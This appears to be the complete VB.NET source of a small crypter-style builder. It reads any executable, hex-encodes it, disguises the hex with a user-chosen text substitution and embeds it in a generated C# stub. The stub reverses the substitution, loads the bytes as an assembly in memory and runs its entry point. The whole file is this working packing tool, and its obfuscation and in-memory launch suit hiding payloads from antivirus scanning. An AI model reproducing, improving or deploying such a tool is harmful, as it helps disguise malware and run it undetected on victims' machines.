﻿Imports System.Text
Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.CodeDom.Compiler

Public Class Main
Public MainString As String = "using System;using System.Collections.Generic;using System.Windows.Forms;" + vbNewLine + "namespace Z" + vbNewLine + "{" + vbNewLine + "static class Program" + vbNewLine + "{" + vbNewLine + "[STAThread]" + vbNewLine + " static void Main()" + vbNewLine + "{" + vbNewLine + "string Oo = ""[tro]"";" + vbNewLine + "byte[] yy = Hex2Bytes(Oo);" + vbNewLine + "System.Reflection.Assembly.Load(yy).EntryPoint.Invoke(null, null);" + vbNewLine + "}" + vbNewLine + "public static byte[] Hex2Bytes(string hex)" + vbNewLine + "{" + vbNewLine + " if (string.IsNullOrEmpty(hex))" + vbNewLine + "  return null;" + vbNewLine + " hex = hex.Replace( ""[repl]"", ""[repl2]"");" + vbNewLine + "byte[] returnBytes = new byte[hex.Length / 2];" + vbNewLine + "for (int i = 0; i < returnBytes.Length; i++)" + vbNewLine + "returnBytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);" + vbNewLine + " return returnBytes;" + vbNewLine + "}" + vbNewLine + "}" + vbNewLine + "}"

Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
Dim op_0 As OpenFileDialog = New OpenFileDialog
If op_0.ShowDialog = Windows.Forms.DialogResult.OK Then
Dim byt_0 As Byte() = IO.File.ReadAllBytes(op_0.FileName)
Dim string_0 As String = Bytes2Hex(byt_0)
    MainString = MainString.Replace("[tro]", string_0).Replace("[repl]", Texttoo.Text).Replace("[repl2]", Textfrom.Text)
End If
    Me.pan_0.BackColor = Color.Chartreuse
End Sub
Public Shared Function Bytes2Hex(bytes As Byte()) As String
    Dim hex As String = String.Empty
    If bytes IsNot Nothing Then
        Dim sb As New StringBuilder()

        For i As Integer = 0 To bytes.Length - 1
            sb.Append(bytes(i).ToString("X2"))
        Next
        hex = sb.ToString().Replace(Main.Textfrom.Text, Main.Texttoo.Text)
    End If
    Return hex
End Function
Private Sub Button3_Click(sender As Object, e As EventArgs)
  Clipboard.SetText(MainString)
End Sub

Private Sub Button2_Click_1(sender As Object, e As EventArgs) Handles Button2.Click
Dim Sa_0 As SaveFileDialog = New SaveFileDialog
Sa_0.Filter = "Text File |.cs"
If Sa_0.ShowDialog = Windows.Forms.DialogResult.OK Then
IO.File.WriteAllText(Sa_0.FileName, MainString)
End If
    Me.pan_0.BackColor = Color.Cyan
End Sub
End Class
